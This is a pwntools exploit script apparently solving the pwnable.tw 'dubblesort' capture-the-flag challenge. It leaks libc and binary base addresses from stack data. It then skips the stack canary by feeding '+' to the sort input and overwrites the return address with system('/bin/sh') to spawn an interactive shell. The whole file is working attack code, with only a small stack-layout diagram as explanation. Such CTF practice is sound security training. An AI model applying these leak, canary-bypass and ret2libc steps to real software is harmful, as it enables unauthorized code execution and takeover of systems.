from pwn import *
elf = context.binary = ELF("./dubblesort_patched")
r = elf.process()
libc = ELF("./libc.so.6")
# r = remote("chall.pwnable.tw", 10101)
# gdb.attach(r, '''
#     b* main+340\n
#     c
# ''')

payload = b"a" * 28
r.send(payload)
r.recvuntil(b"a"*28)
libc.address = u32(r.recv(4)) - 0x1ae244
elf.address = u32(r.recv(4)) - 0x601
log.success(f"LIBC base: {hex(libc.address)}")
log.success(f"ELF base: {hex(elf.address)}")


system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
# Exploit
'''
+------------+
|    esp     |  <--- fmt str
+------------+
| esp + 0x1c |  <--- buf + 0
+------------+
| esp + 0x7c |  <--- canary (buf + 25) --> "+" to bypass
+------------+
|    ...     |
+------------+
| ebp + 0x8  |  <--- ret pointer  (buf + 33)
+------------+
'''
r.sendlineafter(b"to sort :", str(35))
for i in range(24):
    r.sendline(b"1")

r.sendline(b"+")

context.log_level = "DEBUG"
for i in range(8):
    r.sendline(str(system))

r.sendline(str(binsh))
r.sendline(str(binsh))

r.interactive()